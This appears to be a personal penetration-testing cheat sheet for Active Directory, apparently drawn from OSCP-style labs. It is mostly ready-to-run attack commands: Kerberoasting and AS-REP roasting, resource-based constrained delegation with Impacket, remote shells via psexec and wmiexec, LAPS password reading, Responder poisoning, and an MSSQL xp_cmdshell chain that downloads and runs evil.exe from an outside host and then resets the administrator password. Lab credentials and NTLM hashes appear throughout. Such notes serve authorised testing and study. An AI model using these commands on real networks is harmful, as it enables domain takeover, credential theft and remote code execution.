
 

| [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                          | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.                                                                                                                                                                                                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)                                                                   | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                           |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)                                                                                            | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| evil-winrm                                                                                                                                        | Windows Remote Management spwn a shell                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView)<br> | <br>A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [PingCastle](https://www.pingcastle.com/documentation/)<br><br>                                                                                   | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                                   |
| [Group3r](https://github.com/Group3r/Group3r)                                                                                                     | finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
|                                                                                                                                                   |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |



```powershell 
#domain controllers
nltest /dclist:AD.it

```

### Rubeus

```powershell

#Request a spn ticket
 .\Rubeus.exe kerberoast  /outfile:hashes.kerberoast
 
 #s4u 
 .\Rubeus.exe s4u /user:AttackerPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:HOST/TARGETPC.domain.local /ptt
```
### Impacket
```sh
#A powerful remote command execution tool by Microsoft 
impacket-smbexec  access.offsec/svc_mssq:trustno1@192.168.133.187

impacket-wmiexec  access.offsec/svc_mssql:trustno1@192.168.133.187  

impacket-psexec  access.offsec/svc_mssql:trustno1@192.168.133.187  

#add Computer 
impacket-addcomputer -computer-name 'TEST$' -computer-pass 'AttackerPC1!' -dc-ip 192.168.223.175 -dc-host RESOURCED.LOCAL 'resourced.local/l.livingstone' -hashes ":19a3a7550ce8c505c2d46b5e39d6f808"

#RBCD
 impacket-rbcd -dc-ip 192.168.223.175 -delegate-from 'TEST$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 
 
#List AD computers  
impacket-GetADComputers  -dc-ip 192.168.223.175  resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 

```


### AD Module
```powershell 

Install-WindowsFeature -Name "RSAT-AD-PowerShell"
Import-Module ActiveDirectory
#verify
Get-Module ActiveDirectory

```
### PowerView

[powershellmafia]

```powershell
#install module
powershell -ep bypass
. .\Powerview.ps1

#Get current domain
Get-NetDomain

#get object of another domain
Get-NetDomain –Domain moneycorp.local

#check all users wit SPN set 
 get-DomainUser -SPN

#get SPN ticket 
get-DomainSPNTicket -SPN "MSSQLSvc/DC.access.offsec"


# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast


# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

#Get GPO Permessions
Get-GPPermission -GUID 'ID' -TargetType User -TargetName 'OUR_USER'



```

**mssqlclient**
```sh

#sql service account tgs

impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.107.148 -windows-auth

enable_xp_cmdshell

#find a dir to write on

xp_cmdshell dir c:\users\public\document

xp_cmdshell curl http://10.10.10.10/evil.exe  -o c:\users\public\document\evil.exe 

xp_cmdshell  c:\users\public\document\evil.exe 

#or use printspoofer or so to basically change the admin passowrd 
printspoofer -i -c "net user administrator password123"
#disable wifewall enable rdp 


```


### LDAP
**Lightweight Directory Access Protocol (LDAP) directories**. It allows you to search and retrieve information from an **Active Directory (AD) or LDAP server**, such as **users, groups, computers, and other directory objects**.

```sh

#ldap IP address we are searching for the informaion in the Active Directory (AD) domain name (group,user, policy , computer....)
ldapsearch -x -H ldap://192.168.121.122 -b "DC=hutch,DC=offsec0" "(objectClass=*)" 

#enum with username
ldapsearch -x -H ldap://192.168.121.122 -D 'Domain\username' -b "DC=hutch,DC=offsec0" "(objectClass=*)" 
#`objectClass` is an attribute that defines what kind of object it is (user, group, computer, organizationalUnit, etc.).

#usernames
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectclass=*)" | grep sAMAccountName:

#read laps pass
nxc ldap 192.168.104.122 -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --module laps                                              

```

```shell
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

```shell
nxc ldap 10.10.11.35 -u '' -p '' --users 
```
### Kerbrute

after obtainng some samAccountName "username" we can use this account to check if pre-auth is off for any users if pre-auth is disable we may be able to **kerberoast** for domain credentials


```
kerbrute -domain hutch.offsec -dc-ip 192.168.121.122 -user username

```

>brute force for username using kerbrute
```
kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  -t 100
```

### Impacket

```sh
#query Active Directory (AD) for user information from a domain controller

GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
```


```sh
# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords

GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```


>list users in domain
```
net user /domain

```



#### Bloodhound

>standard 

upload  sharphound into the target machine
```sh

SharpHound.exe --CollectionMethods All --Domain <domainname> --DomainController <DCAddress> --LdapUsername <user> --LdapPassword <password> --ZipFileName contoso_sharphound_ldap.zip --OutputDirectory C:\Temp\SharphoundOutput

./sharphound.exe --CollectionMethod All 

sharphound.exe -c all -d active.htb --domaincontroller 10.10.10.10
```

- then we will see bloodhound.zip file

Method to Download:
- Start a smb server on your kali


```
neo4j start
```

- upload the zip file inside the neo4j server 
- search for a specific user like svc_tgs or known username if not go to search pre-build queries  and  click on shortest path from kerberostable users 

>Dump Remotely from the kali connecting remotely to the machine
```
bloodhound-python -u [usename] -p [password] -ns $ip  -d [domain] -c all
```


```sh
# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords

GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```

>Tickets 

**Common Service Types:**

- **`cifs`** = File sharing (SMB)
- **`ldap`** = Active Directory access
- **`HTTP`** = Web services
- **`HOST`** = General host access
- **`DNS`** = DNS services
#### LMNR Poisoning  

LMNR for capturing hashes 
```
responder -I eth0 -rdwv 

https://github.com/Greenwolf/ntlm_theft
```



### PingCastle

```powershell
PingCastle.exe --healthcheck --server corp.local --user bob --password "P@ssw0rd!"
```



[AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) (Sysinternals) is an advanced **AD viewer & editor** which allows:

- GUI browsing of the directory tree
- Editing of object attributes & security descriptors
- Snapshot creation / comparison for offline analysis


### ADRecon

[ADRecon](https://github.com/adrecon/ADRecon) extracts a large set of artefacts from a domain (ACLs, GPOs, trusts, CA templates …) and produces an **Excel report**.

powershell

```powershell
# On a Windows host in the domain
PS C:\> .\ADRecon.ps1 -OutputDir C:\Temp\ADRecon
```


### BloodHound  graph visualisation

[BloodHound](https://github.com/BloodHoundAD/BloodHound) uses graph theory + Neo4j to reveal hidden privilege relationships inside on-prem AD & Azure AD.


### [Collectors](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/bloodhound.html#collectors)

- `SharpHound.exe` / `Invoke-BloodHound` – native or PowerShell variant
- `AzureHound` – Azure AD enumeration
- **SoaPy + BOFHound** – ADWS collection (see link at top)

powershell

```powershell
SharpHound.exe --CollectionMethods All           # Full sweep (noisy)
SharpHound.exe --CollectionMethods Group,LocalAdmin,Session,Trusts,ACL
SharpHound.exe --Stealth --LDAP                      # Low noise LDAP only
```

The collectors generate JSON which is ingested via the BloodHound GUI.


### PingCastle

[PingCastle](https://www.pingcastle.com/documentation/) performs a **health-check** of Active Directory and generates an HTML report with risk scoring.

powershell

```powershell
PingCastle.exe --healthcheck --server corp.local --user bob --password "P@ssw0rd!"
```



### Enum4Linux

```sh
#-a Do all simple enumeration (-U -S -G -P -r -o -n -i).

enum4linux -a $IP 

```